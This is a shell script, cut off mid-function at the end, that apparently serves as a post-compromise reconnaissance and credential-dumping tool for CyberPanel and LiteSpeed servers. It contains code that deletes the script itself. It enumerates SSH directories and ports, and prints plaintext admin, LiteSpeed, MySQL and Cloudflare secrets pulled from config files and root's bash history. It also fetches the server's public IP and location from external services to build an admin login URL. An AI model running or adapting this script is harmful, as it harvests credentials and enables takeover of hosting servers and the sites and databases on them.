#!/bin/sh

BASENAME=$0
GLOBAL_PATH=""
GET_INFO_IP=0
PUBLIC_IP=""
COUNTRY_IP=""
STATE_IP=""
CITY_IP=""
ISP_IP=""

clean(){
	if [ -f "$BASENAME" ];then
		rm -rf "$BASENAME"
	fi
}

trim(){
    stringVal=$1

    if [ -n "$(command -v xargs)" ];then
        stringVal=$(echo "$stringVal" | xargs)
    else
        stringVal=$(echo "$stringVal" | sed -r "s/^[[:space:]]+|[[:space:]]+$//g")
    fi

    printf "%s" "$stringVal"
}

set_default_path() {
	if [ -d "/usr/local/sbin" ];then
		# check if /usr/local/sbin already in path
		if ! echo "$PATH"|grep -qoE '^/usr/local/sbin|:/usr/local/sbin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/usr/local/sbin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/usr/local/sbin"
			fi
		fi
	fi

	if [ -d "/usr/local/bin" ];then
		# check if /usr/local/bin already in path
		if ! echo "$PATH"|grep -qoE '^/usr/local/bin|:/usr/local/bin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/usr/local/bin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/usr/local/bin"
			fi
		fi
	fi

	if [ -d "/usr/sbin" ];then
		# check if /usr/sbin already in path
		if ! echo "$PATH"|grep -qoE '^/usr/sbin|:/usr/sbin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/usr/sbin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/usr/sbin"
			fi
		fi
	fi

	if [ -d "/usr/bin" ];then
		# check if /usr/bin already in path
		if ! echo "$PATH"|grep -qoE '^/usr/bin|:/usr/bin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/usr/bin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/usr/bin"
			fi
		fi
	fi

	if [ -d "/sbin" ];then
		# check if /sbin already in path
		if ! echo "$PATH"|grep -qoE '^/sbin|:/sbin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/sbin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/sbin"
			fi
		fi
	fi

	if [ -d "/bin" ];then
		# check if /bin already in path
		if ! echo "$PATH"|grep -qoE '^/bin|:/bin';then
			if [ -z "$GLOBAL_PATH" ];then
				GLOBAL_PATH="/bin"
			else
				GLOBAL_PATH="${GLOBAL_PATH}:/bin"
			fi
		fi
	fi

	if [ -n "$GLOBAL_PATH" ];then
		# echo "[*] GLOBAL_PATH: $GLOBAL_PATH" 
		# echo "[*] PATH: $PATH" 
		export PATH="$GLOBAL_PATH:$PATH"
		# echo "[*] New PATH: $PATH"
	fi
}

check_proccess() {
	echo "[*] Check current proccess"
	if [ -n "$(command -v ps)" ];then
		ps xf
		echo
	else
		echo "[!] Command ps not found"
	fi

	echo "[*] Check for fake proccess"
	if command -v ps > /dev/null 2>&1; then
		ps aux|grep -iE 'postfix|master|polkit|udev'|grep -viE 'nginx|php|grep'
		echo
	elif command -v pgrep > /dev/null 2>&1; then
		pgrep -fa 'postfix|master|polkit|udev'|grep -viE 'nginx|php'
		echo
	else
		echo "[!] Command pgrep or ps not found"
	fi
}

check_firewall() {
	echo "[*] Check firewall"

	if command -v sestatus > /dev/null 2>&1; then
		sestatus
	elif command -v ufw > /dev/null 2>&1; then
		ufw status
	else
		echo "[+] Firewall disabled"
	fi
	echo
}

check_ports() {
	echo "[*] Check Ports"

	if [ "$(id -u)" -eq 0 ];then
		if command -v sshd > /dev/null 2>&1; then
			sshd -T|grep -iE '^port'|tail -n 1|sed -r 's/[^0-9]+//g'
		elif command -v ss > /dev/null 2>&1; then
			ss -ntulp|grep ssh|head -n 1
		elif command -v netstat > /dev/null 2>&1; then
			netstat -ntulp|grep ssh|head -n 1
		elif [ -r /etc/ssh/sshd_config ];then
			_sshPort=$(grep -iE '^([\s#]?)Port' /etc/ssh/sshd_config|sed -r 's/[^0-9]+//g'|sort -u)
			if [ -n "$_sshPort" ];then
				echo "[+] Found SSH port: $_sshPort"
			fi
		else
			echo "[!] Failed to find ssh port"
		fi
	elif command -v ss > /dev/null 2>&1; then
		ss -ntulp|grep -viE 'users:'
	elif command -v netstat > /dev/null 2>&1; then
		netstat -ntulp|grep '\-'
	elif [ -r /etc/ssh/sshd_config ];then
		_sshPort=$(grep -iE '^([\s#]?)Port' /etc/ssh/sshd_config|sed -r 's/[^0-9]+//g'|sort -u)
		if [ -n "$_sshPort" ];then
			echo "[+] Found SSH port: $_sshPort"
		fi
	else
		echo "[!] Command ss or netstat not found"
	fi
	echo
}

check_user_ssh_dir(){
	if [ "$(id -u)" -eq 0 ];then
		awk -F: '$7 ~ /(([a-zA-Z]+)?sh)$/ && $6 != "/" {print $6}' /etc/passwd | while read -r usrDir
		do
			if [ -d "$usrDir" ]; then
				if [ -d "$usrDir/.ssh" ]; then
					echo "[*] Found user ssh dir $usrDir/.ssh"
					if [ -r "$usrDir/.ssh" ]; then
						ls -la "$usrDir/.ssh"
					fi
				fi
			fi
		done
	else
		# awk -F: '$7 ~ /(bash|sh|zsh)/ && $6 != "/root" && $6 != "/" {print $6}' /etc/passwd | while read dir
		# awk -F: '$7 ~ /((b?a?|z)?sh)/ && $6 != "/root" && $6 != "/" {print $6}' /etc/passwd | while read dir
		awk -F: '$7 ~ /(([a-zA-Z]+)?sh)$/ && $6 != "/root" && $6 != "/" {print $6}' /etc/passwd | while read -r usrDir
		do
			if [ -d "$usrDir" ]; then
				if [ -d "$usrDir/.ssh" ]; then
					echo "[*] Found user ssh dir $usrDir/.ssh"
					if [ -r "$usrDir/.ssh" ]; then
						ls -la "$usrDir/.ssh"
					fi
				fi
			fi
		done
	fi
	echo
}

get_os(){
	_os=""
	if [ -f /etc/redhat-release ] || [ -h /etc/redhat-release ];then
		_os=$(cat /etc/redhat-release)
	elif [ -f /etc/os-release ];then
		if grep -q -iE 'ubuntu' /etc/os-release;then
			_os=$(grep -iE '^(NAME|VERSION)=' /etc/os-release | sed 's/^NAME=//; s/^VERSION=//; s/"//g'|sed ':a;N;$!ba;s/\n/ /g')
		elif grep -q -iE '^PRETTY_NAME=' /etc/os-release;then
			_os=$(grep -iE '^PRETTY_NAME=' /etc/os-release | sed 's/^PRETTY_NAME=//; s/"//g')
		else
			_os=$(grep -iE '^NAME=' /etc/os-release | sed 's/^NAME=//; s/"//g')
		fi
	fi
	printf "%s" "$_os"
}

get_kernel_version(){
	_kernel=""
	if command -v uname > /dev/null 2>&1; then
		if [ -f /etc/redhat-release ] || [ -h /etc/redhat-release ];then
			_kernel=$(uname -srv)
		elif [ -f /etc/os-release ];then
			if grep -q -iE 'redhat' /etc/os-release;then
				_kernel=$(uname -srv)
			else
				_kernel=$(uname -srvm)
			fi
		else
			_kernel=$(uname -srvm)
		fi
	fi
	printf "%s" "$_kernel"
}

get_ip_addr(){
	_ipaddr=""

	# Get IP address from ip command
	if command -v ip > /dev/null 2>&1; then
		_ipaddr=$(ip a | grep -iE 'scope global' | grep -vE 'docker|br\-[0-9]+' | awk '{print $2}')
	elif command -v ifconfig > /dev/null 2>&1; then
		_ipaddr=$(ifconfig | grep -iE 'inet' |grep -iE 'bcast' | grep -vE 'docker|br\-[0-9]+' | awk '{print $2}'|sed 's/addr://')
	else
		# Get IP address from network configuration files

		# Debian/Ubuntu: /etc/network/interfaces
		if [ -f "/etc/network/interfaces" ]; then
			_ipaddr=$(grep -oP 'address \K[^\s]+' /etc/network/interfaces)
		# Netplan (Ubuntu): /etc/netplan/*.yaml
		elif [ -d "/etc/netplan" ]; then
			for file in /etc/netplan/*.yaml; do
				_ipaddr=$(grep -oP 'addresses: \[\K[^\]]+' "$file" | tr -d '[],' | head -n 1)
			done
		# CentOS/RedHat: /etc/sysconfig/network-scripts/ifcfg-*
		elif [ -d "/etc/sysconfig/network-scripts" ]; then
			find /etc/sysconfig/network-scripts/ -type f -name "ifcfg-*" | while read -r file
			do
				_ipaddr=$(grep -oP 'IPADDR=\K[^\s]+' "$file")
			done

		# openSUSE: /etc/sysconfig/network/ifcfg-*
		elif [ -d "/etc/sysconfig/network" ]; then
			find /etc/sysconfig/network/ -type f -name "ifcfg-*" | while read -r file
			do
				_ipaddr=$(grep -oP 'IPADDR=\K[^\s]+' "$file")
			done

		# Arch Linux: /etc/systemd/network/*.network
		elif [ -d "/etc/systemd/network" ]; then
			for file in /etc/systemd/network/*.network; do
				_ipaddr=$(grep -oP 'Address=\K[^\s]+' "$file" | head -n 1)
			done
		fi
	fi

	printf "%s" "$_ipaddr"
}

get_ip_gateway(){
	_gateway=""

	# Get gateway from ip command
	if [ -n "$(command -v ip)" ]; then
		_gateway=$(ip route | grep default | awk '{print $3}')
	elif [ -n "$(command -v route)" ]; then
		_gateway=$(route -n | grep 'UG[ \t]' | awk '{print $2}'|uniq)
	else
		# Get gateway from network configuration files
		if [ -f "/etc/network/interfaces" ]; then
			_gateway=$(grep -oP 'gateway \K[^\s]+' /etc/network/interfaces)
		elif [ -d "/etc/netplan" ]; then
			for file in /etc/netplan/*.yaml; do
				_gateway=$(grep -oP 'gateway4: \K[^\s]+' "$file" | head -n 1)
			done
		elif [ -d "/etc/sysconfig/network-scripts" ]; then
			find /etc/sysconfig/network-scripts/ -type f -name "ifcfg-*" | while read -r file
			do
				_gateway=$(grep -oP 'GATEWAY=\K[^\s]+' "$file")
			done

		elif [ -d "/etc/sysconfig/network" ]; then
			find /etc/sysconfig/network/ -type f -name "ifcfg-*" | while read -r file
			do
				_gateway=$(grep -oP 'GATEWAY=\K[^\s]+' "$file")
			done

		elif [ -d "/etc/systemd/network" ]; then
			for file in /etc/systemd/network/*.network; do
				_gateway=$(grep -oP 'Gateway=\K[^\s]+' "$file" | head -n 1)
			done
		fi
	fi

	_finalGateway=""
	if [ -n "$_gateway" ]; then
		_finalGateway=$(echo "$_gateway"|sort -u)
	fi

	printf "%s" "$_finalGateway"
}

get_ip_nameserver(){
	_nameserver=""

	# Get nameserver from resolv.conf
	if [ -f "/etc/resolv.conf" ]; then
		_nameserver=$(grep -oP 'nameserver \K[^\s]+' /etc/resolv.conf)
	fi

	# get nameserver from network configuration files
	if [ -z "$_nameserver" ]; then
		if [ -d "/etc/netplan" ]; then
			for file in /etc/netplan/*.yaml; do
				_nameserver=$(grep -oP 'nameservers: \[\K[^\]]+' "$file" | tr -d '[],' | head -n 1)
			done
		elif [ -d "/etc/sysconfig/network-scripts" ]; then
			find /etc/sysconfig/network-scripts/ -type f -name "ifcfg-*" | while read -r file
			do
				_nameserver=$(grep -oP 'DNS1=\K[^\s]+' "$file")
			done

		elif [ -d "/etc/sysconfig/network" ]; then
			find /etc/sysconfig/network/ -type f -name "ifcfg-*" | while read -r file
			do
				_nameserver=$(grep -oP 'DNS1=\K[^\s]+' "$file")
			done

		elif [ -d "/etc/systemd/network" ]; then
			for file in /etc/systemd/network/*.network; do
				_nameserver=$(grep -oP 'DNS=\K[^\s]+' "$file" | head -n 1)
			done
		fi
	fi

	printf "%s" "$_nameserver"
}

get_cpu_info(){
	_cpu_info=""
	if command -v nproc > /dev/null 2>&1; then
		_cpu_info=$(nproc)
	elif command -v lscpu > /dev/null 2>&1; then
		_cpu_info=$(lscpu |grep -iE '^(\s+)?CPU\(s\)(\s+)?:'|cut -d: -f2|tr -d '[:space:]')
	elif [ -w /proc/cpuinfo ];then
		_cpu_info=$(grep -ciE '^processor' /proc/cpuinfo)
	fi

	printf "%s" "$_cpu_info"
}

get_memory_info(){
	_memtotal=""
	if command -v dmidecode > /dev/null 2>&1; then
		_memSizes=$(dmidecode -t memory | grep -iE 'size: [0-9]+'| awk '{print $2$3}')
		if [ -n "$_memSizes" ]; then
			_total_mb=0
			_unknown_size=0
			for _memSize in $_memSizes
			do
				if [ -n "$_memSize" ]; then
					if echo "$_memSize" | grep -qiE 'MB'; then
						_slot_mb=$(echo "$_memSize" | sed -r 's/[^0-9]+//g')
						_total_mb=$(( _total_mb + _slot_mb ))
					elif echo "$_memSize" | grep -q -iE 'GB'; then
						_slot_gb=$(echo "$_memSize" | sed -r 's/[^0-9]+//g')
						_total_mb=$(( _total_mb + (_slot_gb * 1024) ))
					else
						_slot_unknown=$(echo "$_memSize" | sed -r 's/[^0-9]+//g')
						_unknown_size=$(( _unknown_size + _slot_unknown ))
					fi
				fi
			done

			if [ "$_total_mb" -gt 0 ]; then
				if [ "$_total_mb" -ge 1024 ]; then
					_memtotal_gb=$(( _total_mb / 1024 ))
					_memtotal="${_memtotal_gb}GB"
				else
					_memtotal="${_total_mb}MB"
				fi
			elif [ "$_unknown_size" -gt 0 ]; then
				_memtotal="${_unknown_size}"
			fi
		fi
	fi

	# if command -v dmidecode > /dev/null 2>&1; then
	# 	_memSize=$(dmidecode -t memory | grep -iE 'size: [0-9]+'| awk '{print $2$3}')
	# 	if [ -n "$_memSize" ]; then
	# 		if echo "$_memSize" | grep -qiE 'MB'; then
	# 			_memtotal_mb=$(echo "$_memSize" | sed -r 's/[^0-9]+//g')
	# 			if [ -n "$_memtotal_mb" ]; then
	# 				if [ "$_memtotal_mb" -ge 1000 ]; then
	# 					_memtotal_gb=$(( _memtotal_mb / 1024 ))
	# 					_memtotal="${_memtotal_gb}GB"
	# 				else
	# 					_memtotal="${_memtotal_mb}MB"
	# 				fi
	# 			fi
	# 		elif echo "$_memtotal_mb" | grep -q -iE 'GB'; then
	# 			_memtotal="$_memtotal_mb"
	# 		else
	# 			_memtotal="$_memSize"
	# 		fi
	# 	fi
	# fi

	# _memtotal=""
	# if command -v dmidecode > /dev/null 2>&1; then
	# 	_memSize=$(dmidecode -t memory | grep -iE 'size: [0-9]+')
	# 	if [ -n "$_memSize" ]; then
	# 		_total_mb=0
	# 		echo "$_memSize" | while read -r line; do
	# 			if echo "$line" | grep -q -iE 'MB'; then
	# 				_slot_mb=$(echo "$line" | sed -r 's/[^0-9]+//g')
	# 				_total_mb=$(( _total_mb + _slot_mb ))
	# 			elif echo "$line" | grep -q -iE 'GB'; then
	# 				_slot_gb=$(echo "$line" | sed -r 's/[^0-9]+//g')
	# 				_total_mb=$(( _total_mb + (_slot_gb * 1024) ))
	# 			fi
	# 		done
	# 		if [ "$_total_mb" -ge 1024 ]; then
	# 			_memtotal_gb=$(( _total_mb / 1024 ))
	# 			_memtotal="${_memtotal_gb}GB"
	# 		else
	# 			_memtotal="${_total_mb}MB"
	# 		fi
	# 	fi
	# fi

	if [ -z "$_memtotal" ]; then
		if command -v lsmem > /dev/null 2>&1; then
			# _totalMemory=$(lsmem |grep -iE 'online memory'|cut -d: -f2|tr -s ' ')
			_onlineMemory=$(lsmem |grep -iE 'online memory'|cut -d: -f2|tr -d '[:space:]')
			# printf "%s" "$_onlineMemory"
			if [ -n "$_onlineMemory" ]; then
				_memtotal="$_onlineMemory"
			fi
		fi
	fi

	if [ -z "$_memtotal" ]; then
		if command -v free > /dev/null 2>&1; then
			_memtotal_mb=$(free -m | grep Mem: | awk '{print $2}')
			if [ -n "$_memtotal_mb" ]; then
				if [ "$_memtotal_mb" -ge 1000 ]; then
					_memtotal_gb=$(( _memtotal_mb / 1000 ))
					# printf "%dGB" "$_memtotal_gb"
					_memtotal="${_memtotal_gb}GB"
				else
					# printf "%dMB" "$_memtotal_mb"
					_memtotal="${_memtotal_mb}MB"
				fi
			fi
		elif [ -w /proc/meminfo ];then
			_memtotal_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
			if [ -n "$_memtotal_kb" ]; then
				if [ "$_memtotal_kb" -ge 1000000 ]; then
					_memtotal_gb=$(( _memtotal_kb / 1000 / 1000 ))
					# printf "%dGB" "$_memtotal_gb"
					_memtotal="${_memtotal_gb}GB"
				else
					_memtotal_mb=$(( _memtotal_kb / 1000 ))
					# printf "%dMB" "$_memtotal_mb"
					_memtotal="${_memtotal_mb}MB"
				fi
			fi
		fi
	fi

	printf "%s" "$_memtotal"
}

get_ssh_port(){
	_sshPort=""
	if [ "$(id -u)" -eq 0 ];then
		if command -v sshd > /dev/null 2>&1; then
			_sshPort=$(sshd -T|grep -iE '^port'|sed -r 's/[^0-9]+//g'|sort -u)
		elif command -v ss > /dev/null 2>&1;then
			_sshPort=$(ss -ntulp|grep ssh|awk '{print $5}'|sed -r 's/.*:([0-9]+)$/\1/'|sort -u)
		elif command -v netstat > /dev/null 2>&1;then
			_sshPort=$(netstat -ntulp|grep ssh|awk '{print $4}'|sed -r 's/.*:([0-9]+)$/\1/'|sort -u)
		fi
	fi

	if [ -z "$_sshPort" ];then
		if [ -f /etc/ssh/sshd_config ];then
			if [ -r /etc/ssh/sshd_config ];then
				_sshPort=$(grep -iE '^([\s#]?)Port' /etc/ssh/sshd_config|sed -r 's/[^0-9]+//g'|sort -u)
			fi
		fi
	fi

	_sshPortFinal=""
	if [ -n "$_sshPort" ];then
		for _port in $_sshPort
		do
			_port=$(trim "$_port")
			if [ -n "$_port" ];then
				if [ -z "$_sshPortFinal" ];then
					_sshPortFinal="$_port"
				else
					_sshPortFinal="$_sshPortFinal, $_port"
				fi
			fi
		done
	fi

	printf "%s" "$_sshPortFinal"
}

cyberpanel_current_version(){
	if [ -f /usr/local/CyberCP/version.txt ];then
		_version=$(< /usr/local/CyberCP/version.txt tr -s '\n' '.'|sed 's/\.$//'|sed -r 's#"version":"([^"]+)","build":([0-9]+)#\1\.\2#g'|sed -r 's#(\{|\})##g')
		if [ -n "$_version" ];then
			_versionClean=$(trim "$_version"|sed -r 's#"version": ?"([^"]+)", ?"build": ?"([0-9]+)"#\1\.\2#g')
			if [ -n "$_versionClean" ];then
				echo "[*] CyberPanel version $_version"
			else
				echo "[*] CyberPanel version $_version"
			fi
		fi
	fi
	echo
}

clean_password(){
	_password=$1
	if echo "$_password" | grep -q 'admin_pass=';then
		_password=$(echo "$_password"|sed 's/admin_pass=//g')
	fi

	printf "%s" "$_password"
}

cyberpanel_admin_password(){
	_adminPassExist=0
	_pass1=""
	_pass2=""
	_pass3=""
	_pass4=""
	_passwords=""

	if [ -f /usr/local/lsws/adminpasswd ];then
		_pass1=$(cat /usr/local/lsws/adminpasswd)
		_adminPassExist=1
	fi

	if [ -f /etc/cyberpanel/adminPass ];then
		_pass2=$(cat /etc/cyberpanel/adminPass)
		# _pass2=$(clean_password "$_pass2")
		_adminPassExist=1
	fi

	if [ -f /root/.litespeed_password ];then
		_pass3=$(cat /root/.litespeed_password)
		_pass3=$(clean_password "$_pass3")
		_adminPassExist=1
	fi

	if [ -f /root/.bash_history ];then
		_pass4=$(grep 'adminPass ' /root/.bash_history|grep -v 'newpassword'|sort -u|sed -r 's/adminPass//g')
		_adminPassExist=1
	fi

	if [ "$_adminPassExist" -eq 1 ];then
		echo "[*] Possible Admin Password"
		if [ -n "$_pass1" ];then
			echo "    $_pass1"
			# _passwords="$_pass1"
			# _passwords="$(printf "$_passwords\n%s" "$_pass1")"
		fi
		if [ -n "$_pass2" ];then
			# echo "    $_pass2"
			# _passwords="$_passwords $_pass2"
			_passwords="$(printf "$_passwords\n%s" "$_pass2")"
		fi
		if [ -n "$_pass3" ];then
			# echo "    $_pass3"
			# _passwords="$_passwords $_pass3"
			_passwords="$(printf "$_passwords\n%s" "$_pass3")"
		fi
		if [ -n "$_pass4" ];then
			for _pass in $_pass4
			do
				_pass=$(trim "$_pass")
				_pass=$(clean_password "$_pass")
				if [ -n "$_pass" ];then
					# echo "    $_pass"
					# _passwords="$_passwords $_pass"
					_passwords="$(printf "$_passwords\n%s" "$_pass")"
				fi
			done
		fi
		if [ -n "$_passwords" ];then
			_sortedList=$(echo "$_passwords"|sort -u)
			for _pass in $_sortedList
			do
				_pass=$(trim "$_pass")
				if [ -n "$_pass" ];then
					echo "    $_pass"
				fi
			done
		fi
		echo
	fi
}

litespeed_admin_password(){
	litespeedPassExist=0
	_pass1=""
	_pass2=""
	_passwords=""

	if [ -f /root/.litespeed_password ];then
		_pass1=$(cat /root/.litespeed_password)
		_pass1=$(clean_password "$_pass1")
		litespeedPassExist=1
	fi

	if [ -f /etc/cyberpanel/webadmin_passwd ];then
		_pass2=$(cat /etc/cyberpanel/webadmin_passwd)
		# _pass2=$(clean_password "$_pass2")
		litespeedPassExist=1
	fi

	if [ "$litespeedPassExist" -eq 1 ];then
		echo "[*] Possible LiteSpeed Admin Password"
		echo "    Login URL: https://${PUBLIC_IP}:7080"
		if [ -n "$_pass1" ];then
			# echo "    $_pass3"
			# _passwords="$_pass1"
			_passwords="$(printf "$_passwords\n%s" "$_pass1")"
		fi
		if [ -n "$_pass2" ];then
			# echo "    $_pass4"
			# _passwords="$_passwords $_pass2"
			_passwords="$(printf "$_passwords\n%s" "$_pass2")"
		fi

		if [ -n "$_passwords" ];then
			_sortedList=$(echo "$_passwords"|sort -u)
			for _pass in $_sortedList
			do
				_pass=$(trim "$_pass")
				if [ -n "$_pass" ];then
					echo "    $_pass"
				fi
			done
		fi
		echo
	fi
}

cyberpanel_get_active_domain() {
    if [ -d /home/cyberpanel ] || [ -d /usr/local/lsws/conf/vhosts ]; then
        # Handle .bwmeta files in /home/cyberpanel
        if [ -d /home/cyberpanel ]; then
			find /home/cyberpanel/ -type f -name "*.bwmeta" 2>/dev/null | while read -r file
			do
				_domain=$(basename "$file" | sed 's/\.bwmeta$//')
				if [ "$_domain" != "Example" ];then
					# convert to lowercase
					echo "$_domain"|tr '[:upper:]' '[:lower:]'
				fi
			done
        fi

        # Handle vhost directories in /usr/local/lsws/conf/vhosts
        if [ -d /usr/local/lsws/conf/vhosts ]; then
            find /usr/local/lsws/conf/vhosts -maxdepth 1 -type d | while read -r vhost
			do
				_domain=$(basename "$vhost")
				if [ "$_domain" != "vhosts" ] && [ "$_domain" != "Example" ] && [ "$_domain" != "localhost.domain" ];then
					# convert to lowercase
					echo "$_domain"|tr '[:upper:]' '[:lower:]'
				fi
			done
        fi
    fi
}

cyberpanel_cloudflare(){
	if [ -f /home/cyberpanel/CloudFlareadmin ]; then
		echo "[*] CloudFlare Admin"
		_CloudFlareadmin=$(cat /home/cyberpanel/CloudFlareadmin)
		printf "%s\n" "$_CloudFlareadmin"
		echo
	fi
}

cyberpanel_mysql_root_password(){
	if [ -f /usr/local/CyberCP/CyberCP/settings.py ];then
		echo "[*] Database Configuration"

		grep -E "'(NAME|USER|PASSWORD|HOST|PORT)'" /usr/local/CyberCP/CyberCP/settings.py|grep -v 'django.contrib' | while read -r val
		do
			if [ -n "$val" ];then
				if echo "$val" | grep -q -iE "'NAME'"; then
					_dbName=$(echo "$val"|sed "s/'NAME'://g"|sed "s/'//g"|sed -r "s/,$//g")
					_dbName=$(trim "$_dbName")
					if [ -n "$_dbName" ];then
						echo "DBNAME: $_dbName"
					fi
				fi

				if echo "$val" | grep -q -iE "'USER'"; then
					_dbUser=$(echo "$val"|sed "s/'USER'://g"|sed "s/'//g"|sed -r "s/,$//g")
					_dbUser=$(trim "$_dbUser")
					if [ -n "$_dbUser" ];then
						echo "DBUSER: $_dbUser"
					fi
				fi

				if echo "$val" | grep -q -iE "'PASSWORD'"; then
					_dbPass=$(echo "$val"|sed "s/'PASSWORD'://g"|sed "s/'//g"|sed -r "s/,$//g")
					_dbPass=$(trim "$_dbPass")
					if [ -n "$_dbPass" ];then
						echo "DBPASS: $_dbPass"
					fi
				fi

				if echo "$val" | grep -q -iE "'HOST'"; then
					_dbHost=$(echo "$val"|sed "s/'HOST'://g"|sed "s/'//g"|sed -r "s/,$//g")
					_dbHost=$(trim "$_dbHost")
					if [ -n "$_dbHost" ];then
						echo "DBHOST: $_dbHost"
					fi
				fi

				if echo "$val" | grep -q -iE "'PORT'"; then
					_dbPort=$(echo "$val"|sed "s/'PORT'://g"|sed "s/'//g"|sed -r "s/,$//g")
					_dbPort=$(trim "$_dbPort")
					if [ -n "$_dbPort" ];then
						_dbPort=$(echo "$_dbPort"|tr -d -c 0-9)
						if [ -n "$_dbPort" ];then
							echo "DBPORT: $_dbPort"
							echo
						else
							echo
						fi
					else
						echo
					fi
				fi
			fi
		done
	else
		_dbPassExist=0
		_dbPass1=""
		_dbPass2=""
		_dbPass3=""
		_dbPass4=""
		_dbPass5=""

		if [ -f /usr/local/CyberCP/.dbpass ];then
			_dbPass1=$(cat /usr/local/CyberCP/.dbpass)
			_dbPassExist=1
		fi

		if [ -f /etc/cyberpanel/mysqlPassword ];then
			_dbPass2=$(cat /etc/cyberpanel/mysqlPassword)
			_dbPassExist=1
		fi

		if [ -f /root/.my.cnf ];then
			_dbPass3=$(cat /root/.my.cnf)
			_dbPassExist=1
		fi

		if [ -f /home/cyberpanel/.my.cnf ];then
			_dbPass4=$(cat /home/cyberpanel/.my.cnf)
			_dbPassExist=1
		fi

		if [ -f /root/.db_password ];then
			_dbPass5=$(cat /root/.db_password)
			_dbPassExist=1
		fi

		if [ "$_dbPassExist" -eq 1 ];then
			echo "[*] Possible MySQL Password"
			if [ -n "$_dbPass1" ];then
				echo "    $_dbPass1"
			fi
			if [ -n "$_dbPass2" ];then
				echo "    $_dbPass2"
			fi
			if [ -n "$_dbPass3" ];then
				echo "    $_dbPass3"
			fi
			if [ -n "$_dbPass4" ];then
				echo "    $_dbPass4"
			fi
			if [ -n "$_dbPass5" ];then
				echo "    $_dbPass5"
			fi
			echo
		fi
	fi
}

cyberpanel_print_active_domain(){
	_domains="$(cyberpanel_get_active_domain|sort -u|grep -viE '^localhost$|^example$|^localhost\.*?$|^.*?-suspended$')"
	if [ -n "$_domains" ]; then
		echo "[*] Active Domain"
		echo "$_domains"
		echo
	fi
}

# Get details IP and Country from external URL
get_info_ipwho_is(){
	# Source 2 : curl "http://ipwho.is/"
	# Example 2: {"ip":"206.206.77.33","success":true,"type":"IPv4","continent":"Asia","continent_code":"AS","country":"Singapore","country_code":"SG","region":"Southeast","region_code":"","city":"Singapore","latitude":1.3553794,"longitude":103.8677444,"is_eu":false,"postal":"550304","calling_code":"65","capital":"Singapore","borders":"","flag":{"img":"https:\/\/cdn.ipwhois.io\/flags\/sg.svg","emoji":"\ud83c\uddf8\ud83c\uddec","emoji_unicode":"U+1F1F8 U+1F1EC"},"connection":{"asn":215311,"org":"REGXA LLC","isp":"Regxa Company for Information Technology LTD","domain":"regxa.com"},"timezone":{"id":"Asia\/Singapore","abbr":"+08","is_dst":false,"offset":28800,"utc":"+08:00","current_time":"2025-01-08T03:41:50+08:00"}}
	# _getIP2=$(curl -s -Lk "http://ipwho.is/")
	_getIP1=""
	_ipSource1="http://ipwho.is/"
	if command -v curl > /dev/null 2>&1; then
		_getIP1=$(curl -s -Lk "$_ipSource1")
	elif command -v wget > /dev/null 2>&1; then
		_getIP1=$(wget -qO- "$_ipSource1")
	fi

	if [ -n "$_getIP1" ]; then
		PUBLIC_IP=$(echo "$_getIP1"|sed -r 's/.*"ip":"([^"]+)".*/\1/')
		COUNTRY_IP=$(echo "$_getIP1"|sed -r 's/.*"country":"([^"]+)".*/\1/')
		STATE_IP=$(echo "$_getIP1"|sed -r 's/.*"region":"([^"]+)".*/\1/')
		CITY_IP=$(echo "$_getIP1"|sed -r 's/.*"city":"([^"]+)".*/\1/')
		ISP_IP=$(echo "$_getIP1"|sed -r 's/.*"isp":"([^"]+)".*/\1/')

		if [ -n "$COUNTRY_IP" ]; then
			# echo "[*] IP Address  : $PUBLIC_IP"
			# echo "[*] Country     : $_ipCountry1"
			# echo "[*] State       : $_ipState1"
			# echo "[*] City        : $_ipCity1"
			# echo "[*] ISP         : $_ipIsp1"
			# echo
			# COUNTRY_IP="$_ipCountry1"
			# STATE_IP="$_ipState1"
			# CITY_IP="$_ipCity1"
			# ISP_IP="$_ipIsp1"
			GET_INFO_IP=1
		fi
	fi
}

get_info_ip_api_com(){
	# Source 1 : curl -Lk http://ip-api.com/json/?fields=61439
	# Example 1: {"status":"success","country":"Singapore","countryCode":"SG","region":"03","regionName":"North West","city":"Singapore","zip":"858877","lat":1.35208,"lon":103.82,"timezone":"Asia/Singapore","isp":"Ipxo LLC","org":"Regxa LLC","as":"AS215311 Regxa Company for Information Technology Ltd","query":"206.206.77.33"}

	_getIP1=""
	_ipSource1="http://ip-api.com/json/?fields=61439"
	if command -v curl > /dev/null 2>&1; then
		_getIP1=$(curl -s -Lk "$_ipSource1")
	elif command -v wget > /dev/null 2>&1; then
		_getIP1=$(wget -qO- "$_ipSource1")
	fi

	if [ -n "$_getIP1" ]; then
		PUBLIC_IP=$(echo "$_getIP1"|sed -r 's/.*"query":"([^"]+)".*/\1/')
		COUNTRY_IP=$(echo "$_getIP1"|sed -r 's/.*"country":"([^"]+)".*/\1/')
		STATE_IP=$(echo "$_getIP1"|sed -r 's/.*"regionName":"([^"]+)".*/\1/')
		CITY_IP=$(echo "$_getIP1"|sed -r 's/.*"city":"([^"]+)".*/\1/')
		ISP_IP=$(echo "$_getIP1"|sed -r 's/.*"isp":"([^"]+)".*/\1/')

		if [ -n "$COUNTRY_IP" ]; then
			# echo "[*] IP Address  : $PUBLIC_IP"
			# echo "[*] Country     : $_ipCountry1"
			# echo "[*] State       : $_ipState1"
			# echo "[*] City        : $_ipCity1"
			# echo "[*] ISP         : $_ipIsp1"
			# echo
			# COUNTRY_IP="$_ipCountry1"
			# STATE_IP="$_ipState1"
			# CITY_IP="$_ipCity1"
			# ISP_IP="$_ipIsp1"
			GET_INFO_IP=1
		fi
	fi
}

get_info_ip(){
	get_info_ipwho_is
	if [ "$GET_INFO_IP" -eq 0 ]; then
		get_info_ip_api_com
	fi
}

get_detail(){
	_vmHypervisor=""
	_vmIPaddr=$(get_ip_addr)
	_vmGateway=$(get_ip_gateway)
	_vmDns=$(get_ip_nameserver)
	_vmHostname=""
	_vmOS=$(get_os)
	_vmKernel=$(get_kernel_version)
